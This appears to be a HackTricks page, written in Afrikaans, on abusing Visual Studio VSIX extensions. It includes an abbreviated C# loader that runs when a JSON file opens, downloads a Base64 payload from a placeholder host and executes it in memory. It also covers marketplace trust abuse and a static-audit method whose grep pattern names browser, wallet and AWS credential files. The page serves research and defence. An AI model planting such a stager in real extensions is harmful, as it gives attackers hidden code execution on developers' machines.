# Misbruik van Visual Studio VSIX-uitbreidings

{{#include ../banners/hacktricks-training.md}}

’n Visual Studio-uitbreiding kan gewone redigeerderaktiwiteit in kode-uitvoering onder die aangemelde gebruiker se identiteit omskep. ’n Kwaadwillige VSIX, ’n uitgewer wat soos ’n bekende uitgewer lyk, of ’n gekompromitteerde uitbreidingsopdatering kan daardie gebruiker via gewone installasiekanale bereik. Installering met ’n administrateur-aanporboodskap is ’n installasiepad waarvoor toestemming gegee word, nie ’n outomatiese voorregteverhoging nie.<sup>[[1]](#references)</sup>

## Uitvoeringsmodel

Klassieke VSSDK-uitbreidings word gewoonlik binne `devenv.exe` uitgevoer. Die nuwer `VisualStudio.Extensibility`-model laat moderne .NET-uitbreidings hoofsaaklik buite die proses loop: Visual Studio tree as tussenganger vir oproepe na ’n toegewyde `Microsoft.ServiceHub.Host.Extensibility`-proses op, wat die IDE se stabiliteit isoleer, maar **nie** die uitbreiding van die gebruiker se Windows-toestemmings afsonder nie. Die presiese uitvoerbare lêernaam kan ’n argitektuuraanduiding insluit, soos `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Sneller by gewone redigeerderaktiwiteit

In plaas daarvan om slegs ’n opvallende kieslysopdrag bloot te stel, kan ’n uitbreiding `ITextViewOpenClosedListener` implementeer. Die `TextViewOpenedAsync`-terugroeping word vir ooreenstemmende dokumente aangeroep, terwyl `TextViewExtensionConfiguration.AppliesTo` aktivering tot ’n algemene tipe, soos JSON, kan beperk. ’n Werklike formateerder of linter kan steeds sy aangekondigde werk verrig terwyl ’n tweede aksie as ’n newe-effek van die oopmaak van ’n lêer loop.<sup>[[1]](#references)[[3]](#references)</sup>

Die volgende verkorte patroon wys die belangrike uitvoeringspunte; die wettige formateerder en foutafhandeling is ter wille van duidelikheid weggelaat.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Gebeurtenis-geaktiveerde, in-geheue-laaier vir bestuurde samestellings</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Hierdie ketting laai Base64-teks af, dekodeer dit na assembly-grepe, laai dit vanaf ’n `MemoryStream` deur ’n versamelbare `AssemblyLoadContext`, roep die gereflekteerde `EntryPoint` met óf geen parameters óf ’n `string[]` aan, wag op asynchrone ingangspunte en laai die konteks af. Die tweede stadium word nie na skyf geskryf nie, hoewel die VSIX en primêre uitbreiding-DLL skyfartefakte bly. Base64 bied geen egtheidsverifikasie of vertroulikheid nie; die gebruik van HTTP laat ’n aanvaller op die pad ook toe om die antwoord te vervang.<sup>[[1]](#references)</sup>

Operasionele variasies sluit in om alle uitsonderings te onderdruk sodat die geadverteerde funksie aanhou werk wanneer staging misluk, of om `ITextViewChangedListener` te gebruik om ná wysigings te aktiveer. Kode word in die uitbreidinggasheer uitgevoer en kan bestuurde API’s, P/Invoke, lêers, geloofsbriewe en kinderprosesse gebruik wat vir daardie gebruiker beskikbaar is.<sup>[[1]](#references)</sup>

Vir ’n verwante redigeerder-spesifieke uitvoeringsoppervlak wat op inheemse inprop-outolaaiing gebaseer is, sien:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Misbruik van Marketplace- en afleweringsvertroue

’n VSIX kan as ’n direk gedeelde/uitgevisselde lêer, vanaf die web Marketplace of deur Visual Studio se ingeboude Marketplace-blaaier aankom. Uitgewerregistrasie, wat hoofsaaklik uniekheid en ’n lys gereserveerde woorde afdwing, kan visueel suggestiewe uitgeweridentiteite toelaat; die kompromittering van ’n reeds vertroude uitgewer of uitbreiding is selfs doeltreffender omdat dit ’n geïnstalleerde gebruikersbasis erf. Marketplace-installasie roep Visual Studio Installer aan en plaas die afgelaaide VSIX tydelik onder `%LOCALAPPDATA%\Temp`; `payload.vsix` word ook wettig gebruik, dus is die lêernaam alleen nie ’n aanduiding nie.<sup>[[1]](#references)</sup>

MDSec het nie ’n Visual Studio-URL-protokol geïdentifiseer wat ’n uitbreiding direk installeer nie. ’n Operateur moet steeds die gebruiker kry om die VSIX te installeer/vertrou, of moet ’n bestaande uitbreiding se verspreidingspad kompromitteer. ’n `AllUsers`-pakket installeer onder die Visual Studio-installasiegids en kan verhoogde regte versoek, maar dit is normale gedrag van ’n installeerder waarvoor toestemming gegee word, eerder as ’n outomatiese roete na administrateur- of SYSTEM-regte.<sup>[[1]](#references)[[4]](#references)</sup>

### Statiese ouditering op skaal

VSIX-pakkette is gewoonlik ZIP-houers, dus kan ’n veilige Marketplace-hersieningspyplyn pakkette lys, hulle **sonder om uitbreidingkode te laai** uitpak, die manifeste ontleed, uitvoerbare oppervlaktes identifiseer en bestuurde assemblies met `ilspycmd` dekompileer. Gee voorkeur aan assemblies wat deur die uitbreiding besit word nadat algemene gebundelde afhanklikhede uitgesluit is, en korreleer dan stringe van geloofsbriewewinkels met gedragsgroeperings soos lêerlees plus netwerkversending, enkodering plus versending, aflaai plus uitvoering, geloofsbriewebestuurder plus netwerktoegang, of skermskoot plus versending.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Inventariseer ook native DLL's, MSBuild-teikens, skrifte, T4-sjablone en installeerdervragte, eerder as om aan te neem dat elke uitvoeringsoppervlak uit managed code bestaan. Vergelyk verdagte gedrag met die doel wat in die manifes beweer word; telemetrie en wettige opdateringsprogramme kan soos data-eksfiltrasie of staging lyk. Slegs statiese hersiening mis verpakte, verduisterde, dinamies opgeloste en sluimerende kode, en as jy net die nuutste weergawe hersien, mis jy kwaadwillige historiese vrystellings.<sup>[[1]](#references)</sup>

'n Afsonderlike projeklaaiaanval kan 'n kwaadwillige [MSBuild `GetFrameworkPaths`-teiken](visual-studio-project-msbuild-execution.md) uitvoer sonder om 'n VSIX te installeer.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Visual Studio-uitbreidings, weer besoek](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Oor VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Anatomie van 'n VSIX-pakket](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET-nutsding](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Blinder Tunnel-veldtog teiken Irakse infrastruktuur](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
